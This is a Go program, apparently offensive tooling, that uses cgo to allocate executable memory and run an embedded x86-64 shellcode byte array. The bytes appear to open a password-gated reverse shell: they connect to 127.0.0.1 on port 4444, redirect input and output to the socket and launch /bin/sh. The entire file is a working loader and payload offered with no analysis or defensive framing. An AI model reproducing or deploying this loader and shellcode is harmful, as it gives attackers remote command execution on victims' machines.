package main

/*
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>
void execute(char *shellcode, size_t length) {
	unsigned char *ptr;
	ptr = (unsigned char *) mmap(0, length, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	memcpy(ptr, shellcode, length);
	( *(void(*) ()) ptr)();
}
*/
import "C"
import (
	"unsafe"
)

func runShellcode(shellcode []byte) {
	ptr := &shellcode[0]
	size := len(shellcode)
	C.execute((*C.char)(unsafe.Pointer(ptr)), (C.size_t)(size))
}

func main() {
	shellcode := []byte{
		0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x0f, 0x05, 0x49, 0x89, 0xc7, 0x48, 0x97, 0x48, 0xb9, 0xfe, 0xff, 0xee, 0xa3, 0x80, 0xff, 0xff, 0xfe, 0x48, 0xf7, 0xd9, 0x51, 0x48, 0x89, 0xe6, 0x6a, 0x10, 0x5a, 0x6a, 0x2a, 0x58, 0x0f, 0x05, 0x48, 0x31, 0xc0, 0x4c, 0x89, 0xff, 0x6a, 0x04, 0x5a, 0x48, 0x29, 0xd4, 0x48, 0x89, 0xe6, 0x0f, 0x05, 0x48, 0xb8, 0x45, 0x49, 0x4e, 0x21, 0x4c, 0x45, 0x54, 0x4d, 0x48, 0x89, 0xf7, 0x48, 0xaf, 0x75, 0xde, 0x4c, 0x89, 0xff, 0x6a, 0x02, 0x5e, 0x6a, 0x21, 0x58, 0x0f, 0x05, 0x48, 0xff, 0xce, 0x79, 0xf6, 0x48, 0x31, 0xd2, 0x52, 0x48, 0xbb, 0x2f, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x53, 0x48, 0x89, 0xe7, 0x52, 0x48, 0x89, 0xe2, 0x57, 0x48, 0x89, 0xe6, 0x6a, 0x3b, 0x58, 0x0f, 0x05,
	}
	runShellcode(shellcode)
}
